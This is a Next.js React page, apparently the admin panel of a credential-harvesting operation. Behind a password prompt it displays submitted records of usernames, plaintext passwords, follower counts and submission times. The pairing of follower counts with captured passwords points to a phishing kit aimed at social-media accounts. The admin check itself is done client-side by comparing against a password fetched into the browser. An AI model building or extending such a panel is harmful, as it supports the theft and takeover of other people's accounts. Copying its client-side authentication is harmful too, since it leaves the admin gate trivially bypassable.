'use client';

import { useState, useEffect } from 'react';
import { getPassword, getUsers } from '@/lib/utils';

interface UserData {
  id: string;
  username: string;
  password: string;
  followers: string;
  timestamp: string;
}

export default function UserDataPage() {
  const [userData, setUserData] = useState<UserData[]>([]);
  const [isDarkMode, setIsDarkMode] = useState(false);
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isLoadingUsers, setIsLoadingUsers] = useState(false);

  useEffect(() => {
    // Check localStorage first, then system preferences
    const savedMode = localStorage.getItem('darkMode');
    if (savedMode !== null) {
      setIsDarkMode(savedMode === 'true');
    } else {
      const darkModeMediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
      setIsDarkMode(darkModeMediaQuery.matches);
    }
  }, []);

  useEffect(() => {
    // Update the HTML class when dark mode changes
    document.documentElement.classList.toggle('dark', isDarkMode);
  }, [isDarkMode]);

  useEffect(() => {
    // Load users when authenticated
    if (isAuthenticated) {
      loadUsers();
    }
  }, [isAuthenticated]);

  const loadUsers = async () => {
    setIsLoadingUsers(true);
    try {
      const users =  getUsers();
      setUserData(users);
    } catch (error) {
      console.error('Error loading users:', error);
      setError('Error loading user data');
    } finally {
      setIsLoadingUsers(false);
    }
  };

  const toggleDarkMode = () => {
    setIsDarkMode(!isDarkMode);
    localStorage.setItem('darkMode', (!isDarkMode).toString());
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString();
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');

    try {
      const correctPassword = await getPassword();
      if (password === correctPassword) {
        setIsAuthenticated(true);
      } else {
        setError('Incorrect password');
      }
    } catch (error) {
      setError('Error verifying password');
      console.error('Password verification error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-indigo-400 via-purple-500 to-pink-500 dark:from-indigo-900 dark:via-purple-900 dark:to-pink-900 flex items-center justify-center p-4">
        <div className="max-w-md w-full bg-white/95 dark:bg-black/95 backdrop-blur-md p-8 rounded-xl shadow-2xl border border-white/30 dark:border-gray-800">
          <div className="text-center mb-6">
            <h1 className="text-3xl font-bold bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 bg-clip-text text-transparent">
              Admin Access
            </h1>
            <p className="text-gray-600 dark:text-gray-300 mt-2">
              Please enter the admin password to continue
            </p>
          </div>

          <form onSubmit={handlePasswordSubmit} className="space-y-4">
            <div>
              <label htmlFor="password" className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                Password
              </label>
              <input
                id="password"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="mt-1 block w-full px-3 py-2 border border-gray-300 dark:border-gray-700 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 transition duration-150 ease-in-out bg-white/90 dark:bg-gray-800/90 backdrop-blur-sm text-gray-900 dark:text-white"
                required
              />
            </div>

            {error && (
              <div className="text-red-500 text-sm text-center">{error}</div>
            )}

            <button
              type="submit"
              disabled={isLoading}
              className="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-lg text-sm font-medium text-white bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 hover:from-indigo-600 hover:via-purple-600 hover:to-pink-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-purple-500 transition duration-150 ease-in-out transform hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isLoading ? 'Verifying...' : 'Access Dashboard'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-indigo-400 via-purple-500 to-pink-500 dark:from-indigo-900 dark:via-purple-900 dark:to-pink-900 p-4">
      <div className="max-w-4xl mx-auto">
        <div className="flex justify-between items-center mb-8">
          <h1 className="text-3xl font-bold bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 bg-clip-text text-transparent">
            User Data Dashboard
          </h1>
          <div className="flex items-center gap-4">
            <button
              onClick={loadUsers}
              disabled={isLoadingUsers}
              className="p-2 rounded-lg bg-white/30 dark:bg-black/30 hover:bg-white/40 dark:hover:bg-black/40 transition-colors shadow-lg"
              title="Refresh data"
            >
              <svg className="w-5 h-5 text-gray-700 dark:text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
              </svg>
            </button>
            <button
              onClick={toggleDarkMode}
              className="p-2 rounded-lg bg-white/30 dark:bg-black/30 hover:bg-white/40 dark:hover:bg-black/40 transition-colors shadow-lg"
              aria-label="Toggle dark mode"
            >
              {isDarkMode ? (
                <svg className="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" />
                </svg>
              ) : (
                <svg className="w-5 h-5 text-gray-700" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z" />
                </svg>
              )}
            </button>
          </div>
        </div>

        {isLoadingUsers ? (
          <div className="bg-white/95 dark:bg-black/95 backdrop-blur-md p-8 rounded-xl shadow-2xl border border-white/30 dark:border-gray-800 text-center">
            <p className="text-gray-600 dark:text-gray-300">Loading user data...</p>
          </div>
        ) : userData.length === 0 ? (
          <div className="bg-white/95 dark:bg-black/95 backdrop-blur-md p-8 rounded-xl shadow-2xl border border-white/30 dark:border-gray-800 text-center">
            <p className="text-gray-600 dark:text-gray-300">No user data available yet.</p>
          </div>
        ) : (
          <div className="space-y-4">
            {userData.map((user) => (
              <div
                key={user.id}
                className="bg-white/95 dark:bg-black/95 backdrop-blur-md p-6 rounded-xl shadow-2xl border border-white/30 dark:border-gray-800 transform hover:scale-[1.02] transition-transform"
              >
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <h3 className="text-lg font-semibold text-gray-900 dark:text-white">User Information</h3>
                    <div className="mt-2 space-y-2">
                      <div className="flex items-center">
                        <span className="text-gray-500 dark:text-gray-400 w-24">Username:</span>
                        <span className="text-gray-900 dark:text-white font-medium">{user.username}</span>
                      </div>
                      <div className="flex items-center">
                        <span className="text-gray-500 dark:text-gray-400 w-24">Password:</span>
                        <span className="text-gray-900 dark:text-white font-medium">{user.password}</span>
                      </div>
                      <div className="flex items-center">
                        <span className="text-gray-500 dark:text-gray-400 w-24">Followers:</span>
                        <span className="text-gray-900 dark:text-white font-medium">{user.followers}</span>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-end justify-end">
                    <span className="text-sm text-gray-500 dark:text-gray-400">
                      Submitted: {formatDate(user.timestamp)}
                    </span>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
} 